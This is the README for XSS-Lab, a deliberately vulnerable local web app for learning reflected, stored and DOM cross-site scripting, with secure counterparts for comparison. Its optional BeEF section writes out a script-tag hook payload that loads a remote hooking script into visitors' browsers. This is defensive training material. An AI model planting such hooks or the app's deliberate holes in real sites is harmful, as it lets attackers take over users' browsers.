```text
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   ██╗  ██╗███████╗███████╗       ██╗      █████╗ ██████╗     ║
║   ╚██╗██╔╝██╔════╝██╔════╝       ██║     ██╔══██╗██╔══██╗    ║
║    ╚███╔╝ ███████╗███████╗       ██║     ███████║██████╔╝    ║
║    ██╔██╗ ╚════██║╚════██║       ██║     ██╔══██║██╔══██╗    ║
║   ██╔╝ ██╗███████║███████║       ███████╗██║  ██║██████╔╝    ║
║   ╚═╝  ╚═╝╚══════╝╚══════╝       ╚══════╝╚═╝  ╚═╝╚═════╝     ║
║                                                              ║
║                         XSS-LAB                              ║
║                                                              ║
║                      Created by                              ║
║                      ALIF MORTAZA                            ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
```

# XSS-Lab

A local, intentionally vulnerable web application designed for learning and practicing Cross-Site Scripting (XSS) in a controlled environment.

**Created by ALIF MORTAZA**

---

## ⚠️ Safety Notice

> [!CAUTION]
> **DELIBERATELY VULNERABLE EDUCATIONAL APPLICATION**
>
> - XSS-Lab is intentionally vulnerable to Cross-Site Scripting.
> - It is designed solely for local educational use and defensive security training.
> - Run it on your own machine or an authorized local testing environment.
> - **Must NOT be exposed to the public internet or an untrusted network.**
> - The default configuration binds strictly to the loopback interface (`127.0.0.1:3000`).

---

## Supported Platforms

| Platform | Support Status | Notes |
| :--- | :---: | :--- |
| **Windows** | **SUPPORTED / VERIFIED** | Tested on Windows with PowerShell and Command Prompt (`npm.cmd`). |
| **Docker** | **SUPPORTED / VERIFIED** | Verified with `docker compose` and Alpine Linux Node.js container. |
| **Ubuntu Linux** | **EXPECTED TO WORK** | Standard Node.js runtime on Debian/Ubuntu environments. |
| **Kali Linux** | **EXPECTED TO WORK** | Standard Node.js runtime on penetration testing workstations. |
| **macOS** | **EXPECTED TO WORK** | Standard POSIX Node.js runtime environment. |

---

## Requirements

- **Git**
- **Node.js 18+** (LTS recommended)
- **npm**

---

## Installation

### Windows (PowerShell / Command Prompt)

```powershell
# 1. Clone the repository
git clone https://github.com/alifm0rtaza/XSS-Lab.git

# 2. Enter project directory
cd XSS-Lab

# 3. Install dependencies
npm install
```

### Ubuntu Linux

```bash
# 1. Install prerequisites (if not already installed)
sudo apt update && sudo apt install -y git nodejs npm

# 2. Clone repository & enter directory
git clone https://github.com/alifm0rtaza/XSS-Lab.git
cd XSS-Lab

# 3. Install dependencies
npm install
```

### Kali Linux

```bash
# 1. Clone repository & enter directory
git clone https://github.com/alifm0rtaza/XSS-Lab.git
cd XSS-Lab

# 2. Install dependencies
npm install
```

### macOS

```bash
# 1. Clone repository & enter directory
git clone https://github.com/alifm0rtaza/XSS-Lab.git
cd XSS-Lab

# 2. Install dependencies
npm install
```

### Docker (All Platforms)

```bash
# Clone and run via Docker Compose
git clone https://github.com/alifm0rtaza/XSS-Lab.git
cd XSS-Lab
docker compose up --build
```

---

## Starting XSS-Lab

### Standard Startup
```bash
npm start
```

### Development Mode (with automatic file reload)
```bash
npm run dev
```

### Terminal Output
Upon successful launch, the server binds to `127.0.0.1:3000` and displays:

```text
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   ██╗  ██╗███████╗███████╗       ██╗      █████╗ ██████╗     ║
║   ╚██╗██╔╝██╔════╝██╔════╝       ██║     ██╔══██╗██╔══██╗    ║
║    ╚███╔╝ ███████╗███████╗       ██║     ███████║██████╔╝    ║
║    ██╔██╗ ╚════██║╚════██║       ██║     ██╔══██║██╔══██╗    ║
║   ██╔╝ ██╗███████║███████║       ███████╗██║  ██║██████╔╝    ║
║   ╚═╝  ╚═╝╚══════╝╚══════╝       ╚══════╝╚═╝  ╚═╝╚═════╝     ║
║                                                              ║
║                         XSS-LAB                              ║
║                                                              ║
║                      Created by                              ║
║                      ALIF MORTAZA                            ║
║                                                              ║
╠══════════════════════════════════════════════════════════════╣
║  Status : RUNNING                                            ║
║  Local  : http://127.0.0.1:3000                              ║
║                                                              ║
║  For local educational use only.                             ║
║  Press Ctrl+C to stop.                                       ║
╚══════════════════════════════════════════════════════════════╝

XSS-Lab is ready.

Open:
  http://127.0.0.1:3000

Development mode:
  npm run dev

Stop:
  Ctrl+C
```

---

## Opening the Local Application

Open your browser and navigate to:

```text
http://127.0.0.1:3000
```

To stop the server at any time, press `Ctrl+C` in your terminal.

---

## Features

- **Reflected XSS:** 3-tier lab covering 5 real HTTP query parameters (`q`, `search`, `name`, `message`, `id`) across HTML body, attribute, JavaScript string, and URL contexts.
- **Stored XSS:** 3-tier lab with a multi-field persistent datastore (author, role, website link, comment content) and two-session victim execution simulation.
- **DOM XSS:** 3-tier lab demonstrating client-side sources (`location.search`, `location.hash`) and unsafe sinks (`innerHTML`, `document.write`, `href`).
- **Secure Counterparts:** Direct `/secure` side-by-side versions demonstrating context-aware output encoding, URL sanitization, and safe DOM APIs.
- **XSS Workbench:** Interactive testing matrix and HTTP request inspector (`/workbench`).
- **Source/Sink Visualizer:** Interactive data-flow diagrams illustrating source-to-sink execution paths.
- **Centered Execution Modal:** Non-blocking modal that intercepts `alert()`, `confirm()`, and `prompt()` dialogs while displaying execution details.
- **Burp Suite / OWASP ZAP Support:** Standard HTTP semantics fully inspectable with local proxies.
- **Two-Tier Factory Restore:** Module reset (`POST /api/stored/reset`) and full factory restore with BeEF hook cleanup (`POST /api/lab/restore`).

---

## Optional BeEF Integration

XSS-Lab supports demonstrating Stored XSS leading to browser hooking with the [BeEF Framework](https://beefproject.com/):

- **XSS-Lab URL:** `http://127.0.0.1:3000`
- **BeEF URL:** `http://127.0.0.1:3001` *(configure `beef.http.port: 3001` in BeEF's `config.yaml` to avoid port collision)*
- **Hook Payload:** `<script src="http://127.0.0.1:3001/hook.js"></script>`
- **BeEF UI Panel:** `http://127.0.0.1:3001/ui/panel`
- **Automated Factory Cleanup:** Clicking **"🔄 Restore Entire Lab"** (or calling `POST /api/lab/restore`) uses the BeEF REST API to terminate and delete lab-created hook sessions automatically.

For complete setup steps, see the [BeEF Integration Guide](docs/beef.md).

---

## Running Tests

Run the built-in native test suites:

```bash
# Run unit, integration, and security boundary tests (44 tests)
npm test

# Run live server deep QA verification
npm run test:qa
```

---

## Detailed Documentation

Comprehensive guides are available in the [`docs/`](docs/) directory:

- [Laboratory Guide](docs/labs.md) — In-depth breakdown of Reflected, Stored, and DOM XSS labs.
- [Technical Architecture](docs/architecture.md) — State management, two-tier reset, and execution interception.
- [BeEF Integration Guide](docs/beef.md) — Complete setup and automated REST API cleanup instructions.
- [Burp Suite & OWASP ZAP Guide](docs/burp-zap.md) — Intercepting proxy testing instructions.
- [Troubleshooting Guide](docs/troubleshooting.md) — Common port and environment solutions.

---

## Project Structure

```text
XSS-Lab/
├── .env.example                 # Safe environment configuration template
├── .gitignore                   # Git exclusions (runtime data, logs, env files)
├── Dockerfile                   # Node.js Alpine container definition
├── docker-compose.yml           # Docker Compose (127.0.0.1 port mapping)
├── LICENSE                      # MIT License
├── package.json                 # Project manifest, scripts, and dependencies
├── README.md                    # Main documentation & setup guide
├── data/
│   └── .gitkeep                 # Preserves data directory structure in Git
├── docs/                        # Detailed modular documentation
│   ├── architecture.md          # Technical architecture & state management
│   ├── beef.md                  # Optional BeEF integration guide
│   ├── burp-zap.md              # Burp Suite & OWASP ZAP testing guide
│   ├── labs.md                  # In-depth breakdown of all 3 XSS lab tiers
│   └── troubleshooting.md       # Common setup issues and solutions
├── src/
│   ├── server/
│   │   ├── app.js               # Express application router & middleware
│   │   ├── server.js            # Server entrypoint with ASCII startup banner
│   │   └── utils.js             # Context escaping, visualizer, & layout templates
│   ├── storage/
│   │   ├── beefClient.js        # Genuine BeEF REST API integration & cleanup
│   │   ├── labStore.js          # Full factory restore & runtime file manager
│   │   └── messageStore.js      # Stored XSS persistent JSON storage manager
│   ├── public/
│   │   ├── css/style.css        # Responsive dark-theme UI stylesheet
│   │   └── js/
│   │       ├── dom-vuln.js      # Client-side vulnerable DOM scripts
│   │       └── dom-secure.js    # Client-side secure DOM scripts
│   └── views/
│       ├── docs.js              # In-app documentation & learning guide
│       ├── dom.js               # DOM XSS lab views
│       ├── home.js              # Overview homepage & lab navigator
│       ├── payloads.js          # Educational test inputs guide
│       ├── reflected.js         # Reflected XSS lab views
│       ├── stored.js            # Stored XSS lab views
│       └── workbench.js         # Testing Workbench & request inspector
└── tests/
    ├── deep_qa_verification.js  # Live server deep QA test runner
    ├── dom.test.js              # DOM XSS suite
    ├── modal_and_reset.test.js  # Modal dialog & database reset suite
    ├── payloads.test.js         # Test inputs reference suite
    ├── qa_verification.js       # Live server smoke test runner
    ├── reflected.test.js        # Reflected XSS suite
    ├── restore_and_beef.test.js # Factory restore & BeEF integration suite
    ├── stored.test.js           # Stored XSS suite
    └── workbench.test.js        # Testing Workbench suite
```

---

## Troubleshooting

- **Port in use (`EADDRINUSE`):** Run `PORT=3005 npm start` (or `$env:PORT="3005"; npm.cmd start` on Windows).
- **PowerShell execution policy error:** Run using `npm.cmd start` and `npm.cmd test`.
- For more solutions, see [docs/troubleshooting.md](docs/troubleshooting.md).

---

## License

This project is licensed under the [MIT License](LICENSE).

**XSS-Lab is created and maintained by ALIF MORTAZA.**
